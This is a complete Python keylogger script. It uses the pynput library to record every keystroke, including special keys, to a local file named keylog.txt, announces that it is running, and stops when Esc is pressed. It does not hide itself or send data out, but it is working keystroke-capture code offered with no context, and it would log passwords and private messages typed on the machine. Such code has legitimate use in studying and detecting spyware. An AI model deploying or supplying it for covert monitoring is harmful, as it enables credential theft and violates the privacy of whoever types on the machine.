from pynput import keyboard

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as log_file:
            if hasattr(key, 'char') and key.char is not None:
                log_file.write(key.char)
            else:
                log_file.write(f'[{key}]')
    except Exception as e:
        print(f"Error logging key: {e}")

    # Stop listener when ESC is pressed
    if key == keyboard.Key.esc:
        return False

def main():
    print("Keylogger is running... Press 'Esc' to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
